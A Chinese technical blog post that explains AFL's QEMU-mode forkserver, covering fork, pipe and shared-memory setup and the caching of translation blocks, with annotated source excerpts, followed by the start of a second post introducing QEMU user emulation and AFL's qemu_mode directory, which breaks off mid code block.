<p>最近在实现对于 cgi 的 fuzz，并且也还没有看过 afl-gcc 插桩的原理，此处就以 afl 的 qemu-mode 为例（似乎更加简介明了介绍 forkserver，源码编译的话，是汇编代码），简单介绍一下 afl 中 forkserver 的作用以及实现机制。</p>
<h2 id="afl-qemu-mode-中的-forkserver"><a href="#afl-qemu-mode-中的-forkserver" class="headerlink" title="afl qemu-mode 中的 forkserver"></a>afl qemu-mode 中的 forkserver</h2><p>首先简单说明一下 qemu 的基本执行流程，当 qemu 执行一个程序的时候，需要将 elf 进行加载，从被执行程序的入口点开始对基本块进行翻译。为了提升效率，qemu 会将翻译出来的基本块 TB 存放在 cache 中，当 qemu 执行一个基本块的时候首先判断基本块是否在 cache 中，如果在 cache 则命中直接执行基本块 TB，否则翻译再执行。</p>
<p>afl 的 qemu mode 在编译的时候对 qemu 的源码进行了修改 patch。首先在 elf 加载的时候在 elf 入口点、代码段的 start 和 end 三个地方修改，获得相关地址；然后在 cpu 执行也就是基本块翻译执行的地方进行了修改，也就是进行了与覆盖率统计和 forkserver 相关的插桩。详细的介绍可以看下我的这篇文章：<a href="https://oneshell.top/2022/01/03/afl%20qemu%E6%A8%A1%E5%BC%8F%E7%AE%80%E4%BB%8B/">afl qemu 模式简介</a></p>
<p>afl 的 qemu 模式，在每次执行一个基本块的时候，会调用宏定义 AFL_QEMU_CPU_SNIPPET2 来与 afl-fuzz 进程通信。这也就是在 qemu 实现对于目标程序插桩的原理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_QEMU_CPU_SNIPPET2 do &#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(itb-&gt;pc == afl_entry_point) &#123; \	</span></span><br><span class="line">      afl_setup(); \</span><br><span class="line">      afl_forkserver(cpu); \</span><br><span class="line">    &#125; \</span><br><span class="line">    afl_maybe_log(itb-&gt;pc); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>如果当前执行的基本块是 afl_entry_point，也就是目标程序的入口点，就通过 afl_setup 函数初始化管道和共享内存，然后初始化 forkserver。然后通过 afl-maybe-log 往共享内存中设置覆盖率通信相关信息。此处主要是看一下 forkserver 是如何进行设置的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Fork server logic, invoked once we hit _start. */</span></span><br><span class="line"><span class="comment">// forkserver，会在程序的_start入口处激活一次</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">afl_forkserver</span><span class="params">(CPUState *cpu)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> tmp[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!afl_area_ptr) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Tell the parent that we&#x27;re alive. If the parent doesn&#x27;t want</span></span><br><span class="line"><span class="comment">     to talk, assume that we&#x27;re not running in forkserver mode. */</span></span><br><span class="line">  <span class="comment">// 通过状态管道向afl-fuzz主进程说明，forkserver已经启动</span></span><br><span class="line">  <span class="comment">// 如果写入失败，默认没有使用forkserver模式，return结束</span></span><br><span class="line">  <span class="keyword">if</span> (write(FORKSRV_FD + <span class="number">1</span>, tmp, <span class="number">4</span>) != <span class="number">4</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 获取自身的进程号</span></span><br><span class="line">  afl_forksrv_pid = getpid();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* All right, let&#x27;s await orders... */</span></span><br><span class="line">  <span class="comment">// forkserver的主循环，也是在这个地方一直执行目标程序</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> child_pid;</span><br><span class="line">    <span class="type">int</span> status, t_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Whoops, parent dead? */</span></span><br><span class="line">    <span class="comment">// 从afl-fuzz进程的控制管道读取控制信息，如果读取失败，说明afl-fuzz主进程已经结束</span></span><br><span class="line">    <span class="keyword">if</span> (read(FORKSRV_FD, tmp, <span class="number">4</span>) != <span class="number">4</span>) <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Establish a channel with child to grab translation commands. We&#x27;ll</span></span><br><span class="line"><span class="comment">       read from t_fd[0], child will write to TSL_FD. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(t_fd) || dup2(t_fd[<span class="number">1</span>], TSL_FD) &lt; <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    close(t_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (child_pid &lt; <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="comment">// 进入子进程，</span></span><br><span class="line">    <span class="keyword">if</span> (!child_pid) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Child process. Close descriptors and run free. */</span></span><br><span class="line">	  <span class="comment">// 关闭无关的管道描述符</span></span><br><span class="line">      afl_fork_child = <span class="number">1</span>;</span><br><span class="line">      close(FORKSRV_FD);</span><br><span class="line">      close(FORKSRV_FD + <span class="number">1</span>);</span><br><span class="line">      close(t_fd[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 进入forkserver进程</span></span><br><span class="line">    <span class="comment">/* Parent. */</span></span><br><span class="line"></span><br><span class="line">    close(TSL_FD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(FORKSRV_FD + <span class="number">1</span>, &amp;child_pid, <span class="number">4</span>) != <span class="number">4</span>) <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collect translation requests until child dies and closes the pipe. */</span></span><br><span class="line"></span><br><span class="line">    afl_wait_tsl(cpu, t_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get and relay exit status to parent. */</span></span><br><span class="line">    <span class="comment">// 获取目标程序进程的结束信息，并通过状态管道写回到afl-fuzz主进程中</span></span><br><span class="line">    <span class="keyword">if</span> (waitpid(child_pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">if</span> (write(FORKSRV_FD + <span class="number">1</span>, &amp;status, <span class="number">4</span>) != <span class="number">4</span>) <span class="built_in">exit</span>(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>forkserver 的代码主要流程就是：</p>
<ol>
<li>首先通过状态管道发送数据给 afl-fuzz 主进程，说明 forkserver 创建成功，然后进入 while(1) 循环。在循环中 forkserver 会 read 阻塞在控制管道，等待 alf-fuzz 主进程发送消息。</li>
<li>从控制管道接受到 afl-fuzz 主进程发送的数据后，forkserver fork 出新的子进程，此时的子进程也就是新的目标程序进程，会关闭与afl-fuzz通信的管道，返回继续向下执行目标程序进程在 qemu 中的代码。此时父进程 forkserver 则将新 fork 出来的目标程序进程 pid 通过状态管道发送给afl-fuzz</li>
<li>之后 forkserver 进程进入 afl_wait_tsl，不断循环处理目标程序进程翻译基本块的请求。</li>
<li>最后当目标程序进程执行完毕后，forkserver 获取结束信息，将结束信息通过控制管道发送给 afl-fuzz 用于判断处理 crash。</li>
</ol>
<h2 id="相关函数解析"><a href="#相关函数解析" class="headerlink" title="相关函数解析"></a>相关函数解析</h2><p>如上是 qemu mode 中 forkserver 的基本流程，如下对中间涉及到的函数进行简单说明：</p>
<h3 id="static-void-afl-setup-void"><a href="#static-void-afl-setup-void" class="headerlink" title="static void afl-setup(void)"></a>static void afl-setup(void)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set up SHM region and initialize other stuff. */</span></span><br><span class="line"><span class="comment">// 设置共享内存和相关初始化</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">afl_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 从环境变量SHM_ENV_VAR中获取共享内存ID</span></span><br><span class="line">  <span class="type">char</span> *id_str = getenv(SHM_ENV_VAR),</span><br><span class="line">       *inst_r = getenv(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> shm_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_r) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">    r = atoi(inst_r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (r &gt; <span class="number">100</span>) r = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span> (!r) r = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    afl_inst_rms = MAP_SIZE * r / <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (id_str) &#123;</span><br><span class="line">    <span class="comment">// 获取共享内存ID</span></span><br><span class="line">    shm_id = atoi(id_str);</span><br><span class="line">    <span class="comment">// 获取共享内存指针</span></span><br><span class="line">    afl_area_ptr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (afl_area_ptr == (<span class="type">void</span>*)<span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* With AFL_INST_RATIO set to a low value, we want to touch the bitmap</span></span><br><span class="line"><span class="comment">       so that the parent doesn&#x27;t give up on us. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inst_r) afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_INST_LIBS&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    afl_start_code = <span class="number">0</span>;</span><br><span class="line">    afl_end_code   = (abi_ulong)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* pthread_atfork() seems somewhat broken in util/rcu.c, and I&#x27;m</span></span><br><span class="line"><span class="comment">     not entirely sure what is the cause. This disables that</span></span><br><span class="line"><span class="comment">     behaviour, and seems to work alright? */</span></span><br><span class="line">  <span class="comment">// 线程安全相关？</span></span><br><span class="line">  rcu_disable_atfork();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在 afl_setup 函数中，最主要的就是从相关环境变量获取到共享内存的指针，用于之后进行覆盖率信息统计。</p>
<h3 id="static-void-afl-wait-tsl-CPUState-cpu-int-fd"><a href="#static-void-afl-wait-tsl-CPUState-cpu-int-fd" class="headerlink" title="static void afl_wait_tsl(CPUState *cpu, int fd)"></a>static void afl_wait_tsl(CPUState *cpu, int fd)</h3><p>首先通过分析 qemu mode 的 patch 可知，qemu 在翻译每一个基本块之后，都会执行宏 AFL_QEMU_CPU_SNIPPET1，</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -365,6 +369,7 @@</span></span><br><span class="line">             if (!tb) &#123;</span><br><span class="line">                 /* if no translated code available, then translate it now */</span><br><span class="line">                 tb = tb_gen_code(cpu, pc, cs_base, flags, 0);</span><br><span class="line"><span class="addition">+                AFL_QEMU_CPU_SNIPPET1;</span></span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_QEMU_CPU_SNIPPET1 do &#123; \</span></span><br><span class="line"><span class="meta">    afl_request_tsl(pc, cs_base, flags); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<p>在宏中主要是执行函数 afl_request_tsl，代码如下，基本流程就是：目标程序进程如果需要翻译一个新的基本块，将基本块信息发送给forkserver，让其加入到基本块 cache 中。这样 forkserver 下次 fork 出来一个新的目标程序进程的时候，就可从 cache 中不用再次翻译基本块，提高性能。该函数是在 forkserver fork 出来的目标程序进程中执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This code is invoked whenever QEMU decides that it doesn&#x27;t have a</span></span><br><span class="line"><span class="comment">   translation of a particular block and needs to compute it. When this happens,</span></span><br><span class="line"><span class="comment">   we tell the parent to mirror the operation, so that the next fork() has a</span></span><br><span class="line"><span class="comment">   cached copy. */</span></span><br><span class="line"><span class="comment">// 此代码只有当qemu翻译一个新的基本块tb时才会执行，并会将其加入到forkserver中，使得下一次fork目标程序进程有cache备份</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">afl_request_tsl</span><span class="params">(target_ulong pc, target_ulong cb, <span class="type">uint64_t</span> flags)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">afl_tsl</span> <span class="title">t</span>;</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!afl_fork_child) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  t.pc      = pc;</span><br><span class="line">  t.cs_base = cb;</span><br><span class="line">  t.flags   = flags;</span><br><span class="line">  <span class="comment">// 通过管道发送给forkserver，加入到基本块tb cache中</span></span><br><span class="line">  <span class="keyword">if</span> (write(TSL_FD, &amp;t, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> afl_tsl)) != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> afl_tsl))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次就是 afl_wait_tsl 函数，该函数在 forkserver 中执行。代码的流程是，forkserver 执行该函数进入死循环不断接受来自目标程序进程的基本块翻译情况，接收到信息说明目标程序进程翻译了一个新的基本块，那么 forkserver 就在自身的 cache 中搜索该基本块。如果该基本块不在 cache 中，则将该基本块加入到 cache，这样下一次 forkserver fork 新进程就可以使用该缓存，避免重复翻译，提高性能。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is the other side of the same channel. Since timeouts are handled by</span></span><br><span class="line"><span class="comment">   afl-fuzz simply killing the child, we can just wait until the pipe breaks. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">afl_wait_tsl</span><span class="params">(CPUState *cpu, <span class="type">int</span> fd)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">afl_tsl</span> <span class="title">t</span>;</span></span><br><span class="line">  TranslationBlock *tb;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Broken pipe means it&#x27;s time to return to the fork server routine. */</span></span><br><span class="line">	<span class="comment">// 循环接受来自fork出来的子进程的基本块翻译请求</span></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;t, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> afl_tsl)) != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> afl_tsl))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">	<span class="comment">// 从forkserver的基本块缓存中搜索fork出来的目标进程的基本块</span></span><br><span class="line">    tb = tb_htable_lookup(cpu, t.pc, t.cs_base, t.flags);</span><br><span class="line">	<span class="comment">// 如果forkserver的基本块缓存中没有搜索到，则翻译基本块并加入到forkserver的缓存中</span></span><br><span class="line">    <span class="keyword">if</span>(!tb) &#123;</span><br><span class="line">      mmap_lock();</span><br><span class="line">      tb_lock();</span><br><span class="line">      tb_gen_code(cpu, t.pc, t.cs_base, t.flags, <span class="number">0</span>);</span><br><span class="line">      mmap_unlock();</span><br><span class="line">      tb_unlock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结这篇文章的原因是自己一直没有理解到 forkserver 是如何执行的，毕设涉及到 qemu mode，也需要稍微了解下其中的原理。其实 afl 的 qemu mode 从原理进行分析还是挺简单的，直接分析 patch 文件，看在 qemu 的哪些源码处进行了修改。然后再简单看一下是如何在 qemu 的翻译基本块前后进行相关判断和插桩的。代码量并不多，看完之后对 afl 有了更深的了解，也理解到了 forkserver 在 qemu 模式中是如何启动的，以及通过将每次新翻译的基本块加入到 forkserver 的 cache 中实现性能优化。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/11614235.html">[hac425师傅] 基于qemu和unicorn的Fuzz技术分析</a></li>
<li><a href="https://oneshell.top/2022/01/03/afl%20qemu%E6%A8%A1%E5%BC%8F%E7%AE%80%E4%BB%8B/">[OneShell] afl-qemu模式简介</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/afl%20qemu%20mode%E7%AE%80%E4%BB%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/afl%20qemu%20mode%E7%AE%80%E4%BB%8B/" class="post-title-link" itemprop="url">afl qemu mode简介</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 09:47:28 / Modified: 09:51:28" itemprop="dateCreated datePublished" datetime="2023-04-13T09:47:28+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-qemu-模式简介"><a href="#afl-qemu-模式简介" class="headerlink" title="afl qemu 模式简介"></a>afl qemu 模式简介</h1><p>这篇文章主要是参考了 <a target="_blank" rel="noopener" href="http://mozhucy.cn/2020/03/13/afl-qemu/">afl-qemu</a>，并简单扩展了自己对 QEMU 的理解和最近对于 AFL 源码阅读的一些理解。</p>
<h2 id="qemu-简介"><a href="#qemu-简介" class="headerlink" title="qemu 简介"></a>qemu 简介</h2><p>qemu 在 IoT 漏洞挖掘和复现中被使用得很多用来进行固件的模拟，根据模拟的级别可以分为用户程序模拟和系统虚拟化模拟。</p>
<p>用户程序模拟就是 QEMU 能够将一个平台编译的二进制文件运行在另外一个不同的平台，例如一个 ARM 指令集的二进制程序，通过 QEMU 的 TCG（Tiny Code Generator）处理之后，ARM 指令被转换成 TCG 的中间代码，然后再转换成目的平台的代码。</p>
<p>系统虚拟化模拟指的是 QEMU 能够模拟一个完整的操作系统虚拟机，该虚拟机有自己的虚拟 CPU、芯片组、虚拟内存以及其他的虚拟外设例如网卡，能够给虚拟机中运行的操作系统提供和物理硬件平台一致的硬件视图。</p>
<p>QEMU 能够模拟的平台也很多，常见的 x86&#x2F;64、ARM、MIPS、PPC 等，早期的 QEMU 都是通过 TCG 来完成对硬件平台的模拟，所有的虚拟机指令也需要通过 QEMU 来进行转换，这个地方不继续深入说明，就简单知道有这个基本 TCG 进行指令翻译的流程。回到正式话题，如果我们要对某个其他指令集的二进制文件进行模糊测试，就可以使用 afl 的 qemu mode。</p>
<p>当我们使用 qemu 来加载一个其他指令集的可执行文件（ELF 为例）时，基本的流程如下：</p>
<ul>
<li>qemu 初始化</li>
<li>TCG 初始化</li>
<li>CPU 初始化</li>
<li>加载可执行文件，以 ELF 为例，有对 ELF 的解析过程</li>
<li>syscall 初始化，qemu 是将可执行文件的系统调用转发到宿主机的系统调用来实现</li>
<li>signal 初始化，在 afl 中也是根据 target 执行过程中的 signal 或者结束代码来判断 crash</li>
<li>gdbserver 初始化，如果启动 qemu 的时候选择调试 -g</li>
<li>cpu_loop 开始模拟</li>
</ul>
<p>如上，重要的流程就是 QEMU 分析目标程序的 ELF 结构，分配必要的内存，装载所需要的库，然后开始进行指令集的翻译、执行，并且将遇见的 syscall 系统调用转发到宿主机进行模拟。CPU 执行的基本流程大概是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (;;) &#123;</span><br><span class="line">	cpu_exec();</span><br><span class="line">	switch(处理退出事件)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="afl-qemu-mode"><a href="#afl-qemu-mode" class="headerlink" title="afl qemu mode"></a>afl qemu mode</h2><p>在 afl 源码的 qemu mode 文件夹，目录结构如下，其中有编译 qemu mode 的脚本，qemu-2.10.0 的源码，以及一个 readme 文档。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~/Code/AFL/qemu_mode [22:38:50] </span><br><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── build_qemu_support.sh</span><br><span class="line">├── patches</span><br><span class="line">├── qemu-2.10.0</span><br><span class="line">├── qemu-2.10.0.tar.xz</span><br><span class="line">└── README.qemu</span><br><span class="line"></span><br><span class="line">2 directories, 3 files</span><br></pre></td></tr></table></figure>

<p>在 readme 文档中，有对 qemu mode 的简单介绍，是基于 QEMU 的用户级模拟，用于仿真黑盒闭源二进制文件。</p>
<blockquote>
<ol>
<li>Introduction</li>
</ol>
<hr>
<p>The code in this directory allows you to build a standalone feature that<br>leverages the QEMU “user emulation” mode and allows callers to obtain<br>instrumentation output for black-box, closed-source binaries. This mechanism<br>can be then used by afl-fuzz to stress-test targets that couldn’t be built<br>with afl-gcc.</p>
<p>The usual performance cost is 2-5x, which is considerably better than<br>seen so far in experiments with tools such as DynamoRIO and PIN.</p>
<p>The idea and much of the implementation comes from Andrew Griffiths.</p>
</blockquote>
<p>接下来就是看看 qemu mode 的编译流程，其中大概做了一些注释</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 